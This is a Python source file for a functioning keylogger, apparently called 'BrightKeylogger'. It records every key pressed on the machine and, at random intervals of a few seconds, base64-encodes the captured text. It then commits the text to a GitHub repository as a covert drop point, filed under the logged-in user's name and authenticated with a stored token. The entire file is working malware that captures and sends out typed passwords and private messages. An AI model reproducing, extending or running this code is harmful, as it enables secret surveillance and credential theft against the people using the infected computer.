import keyboard
import time
import threading
import github3
from datetime import datetime
import os
import base64
import sys
import random

"""
Create arg parser
"""
PATH_ON_GITHUB = f"data/"
USER = os.getlogin()

def connect_github():
    with open('mytoken.txt') as f:
        token = f.read().strip()

    user = 'Kirubel1422'
    sess = github3.login(token=token)
    
    return sess.repository(user, 'BrightKeylogger')

class KeyLogger:
    def __init__(self):
        self.keystroke = None
        self.ascii = 0
        self.text_content = ""
        print('[*] Attempting to connect to github')
        try:
            self.repo = connect_github()
            print('[+] Successfully connected to github')
        except Exception as e:
            print(f'[-] Failed to connect to github: {e}')
            sys.exit()

    def onkeystroke(self, event):
        self.keystroke = event.name

        if len(repr(event.name)) != 3:
            self.ascii = 0
        else:
            self.ascii = ord(event.name)

        if 33 <= self.ascii <= 126:
            self.text_content += event.name
        else:   
            self.text_content += f'\nHOT: {event.name}\n' 

    def start_logger(self):
        keyboard.on_press(self.onkeystroke)
        keyboard.wait()
    
    def reset(self):
        self.keystroke = ""
        self.text_content = ""
        self.ascii = 0
        print('[+] Reseted recorded key strokes')

    def run(self):
        t = threading.Thread(target=self.start_logger)
        t.start()

def run():
    kl = KeyLogger()
    kl.run()

    print('[+] Sucessfully started listening on key strokes')
    while True:
        time.sleep(random.randint(3, 10))
        commit_message = datetime.now().isoformat()

        # FOR KEYLOGGER
        remote_keystroke_path = f'{PATH_ON_GITHUB}{USER}/keystrokes/{commit_message}.data'
        bindata = bytes(kl.text_content, "utf-8")

        try:
            kl.repo.create_file(remote_keystroke_path, commit_message, base64.b64encode(bindata))
            print("[+] Keystroke record pushed to github")
            kl.reset()
        except Exception as e:
            print(f'[-] Failed to load data to github: {e}')
        
        print('[*] Recording started again.')
    

if __name__ == "__main__":
    run()
